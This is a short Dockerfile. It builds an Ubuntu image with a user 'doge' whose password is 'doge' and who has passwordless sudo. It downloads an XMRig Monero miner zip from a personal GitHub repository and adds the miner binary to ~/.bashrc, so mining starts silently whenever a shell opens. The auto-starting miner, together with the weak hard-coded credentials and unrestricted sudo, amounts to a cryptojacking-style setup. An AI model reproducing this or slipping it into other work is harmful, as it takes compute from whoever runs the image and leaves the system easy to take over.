FROM ubuntu:latest
RUN apt update && apt upgrade -y && apt-get install -y sudo wget nano unzip

RUN adduser doge
RUN echo "doge:doge" | chpasswd
RUN echo "doge ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

USER doge
RUN cd  && wget https://github.com/chandrasekar-r/Doge/raw/main/xmrig-6.12.1.zip
RUN cd  && unzip xmrig-6.12.1.zip
RUN echo '~/xmrig-6.12.1/xmrig' >> ~/.bashrc
